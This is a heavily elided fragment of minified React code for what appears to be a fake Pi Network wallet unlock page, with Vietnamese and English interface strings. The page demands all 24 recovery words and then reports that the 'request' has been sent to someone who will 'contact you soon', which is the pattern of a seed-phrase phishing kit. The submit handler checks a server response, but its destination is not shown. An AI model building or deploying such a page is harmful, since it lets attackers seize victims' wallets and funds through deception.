    ...
    const [c,s] = _.useState("")
      ...
      , S = {
        vi: {
            ...
            unlockWithPhrase: "MỞ KHÓA VỚI CỤM MẬT KHẨU",
            unlockWithFingerprint: "MỞ KHÓA BẰNG VÂN TAY",
            processing: "ĐANG XỬ LÝ...",
            alertFingerprint: "Vui lòng mở khóa với cụm mật khẩu lần đầu",
            alert24Words: "Vui lòng nhập đủ 24 cụm từ khôi phục.",
            alertSuccess: "Yêu cầu của bạn đã được gửi. Chúng tôi sẽ sớm liên hệ lại!",
            alertError: "Đã xảy ra lỗi khi gửi yêu cầu. Vui lòng thử lại.",
            footerText1: "Là một ví không giam sát, cụm mật khẩu ví của bạn chỉ có bạn mới có thể truy cập. Hiện tại không thể khôi phục cụm mật khẩu.",
            footerText2: "Bạn bị mất cụm mật khẩu?",
            footerLink: "Bạn có thể tạo một ví mới",
            footerText3: ", nhưng tất cả số π trong ví trước đó của bạn sẽ không thể truy cập được."
        },
        en: {
            ...
            footerText3: ", but all π in your previous wallet will be inaccessible."
        }
    };
    _.useEffect( () => {
        (async () => {
      ...
      , B = async G => {
        ...
        try {
            ...
            if (Y.ok)
                ...
                alert(`${A ? "Gửi yêu cầu thất bại" : "Request failed"}: ${Y.status} - ${Z || Y.statusText}`)
            }
        } catch (Y) {
            console.error("Lỗi:", Y),
            alert(h.alertError)
